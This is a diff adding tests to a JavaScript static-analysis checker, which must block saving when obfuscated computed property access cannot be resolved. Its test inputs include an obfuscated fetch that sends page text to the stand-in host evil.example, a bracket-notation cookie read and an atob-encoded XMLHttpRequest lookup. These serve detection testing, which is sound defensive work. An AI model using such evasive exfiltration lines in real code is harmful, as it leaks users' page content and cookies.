@@ -1,8 +1,19 @@
 import { describe, expect, it } from 'vitest'
+import type { Capability } from '@shared/types'
 import { analyseJavaScript, applyCapabilityPolicy } from './static-analysis'
 
 const findingApis = (source: string) =>
   analyseJavaScript(source).findings.map((f) => f.api)
+
+/**
+ * Runs the same two steps the background gate runs and reports whether any
+ * finding blocks saving. Using the real policy step matters: a warning with no
+ * capability attached is not raised by it, which is how #49 passed unnoticed.
+ */
+const blocks = (source: string, declared: Capability[] = []) => {
+  const { findings } = applyCapabilityPolicy(analyseJavaScript(source), declared)
+  return findings.some((f) => f.severity === 'block')
+}
 
 describe('analyseJavaScript', () => {
   it('passes an ordinary DOM transform with no findings', () => {
@@ -66,6 +77,21 @@ describe('analyseJavaScript', () => {
   it('flags dynamic property access as unanalysable rather than clean', () => {
     const apis = findingApis(`window['fet' + 'ch']('/x')`)
     expect(apis).toContain('(dynamic property access)')
+  })
+
+  it('blocks saving when a computed property cannot be resolved (#49)', () => {
+    for (const source of [
+      `globalThis['fe' + 'tch']('https://evil.example/?c=' + encodeURIComponent(document.body.innerText))`,
+      `const c = document['cookie']`,
+      `const X = window[atob('WE1MSHR0cFJlcXVlc3Q=')]`,
+    ]) {
+      expect(blocks(source), `expected a block for: ${source}`).toBe(true)
+    }
+  })
+
+  it('does not block a computed property that is a plain index', () => {
+    // Control: the rule must not simply block every bracket access.
+    expect(blocks(`const first = items[0]; const el = rows[2];`)).toBe(false)
   })
 
   it('treats numeric indexing as ordinary, not obfuscation', () => {
